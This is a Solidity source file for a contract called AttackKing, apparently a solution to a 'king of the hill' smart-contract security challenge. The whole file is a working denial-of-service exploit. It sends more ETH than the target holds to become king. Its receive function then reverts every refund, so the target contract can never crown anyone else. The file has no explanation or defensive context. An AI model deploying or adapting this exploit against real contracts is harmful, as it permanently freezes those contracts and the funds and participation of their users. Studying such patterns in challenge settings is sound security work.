// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address payable public kingContract;

    constructor(address payable _kingContract) {
        kingContract = _kingContract;
    }

    function attack() external payable {
        require(msg.value > address(kingContract).balance, "Not enough ETH sent");
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // This fallback function will cause the transaction to revert
    receive() external payable {
        revert("I refuse to relinquish kingship");
    }
}
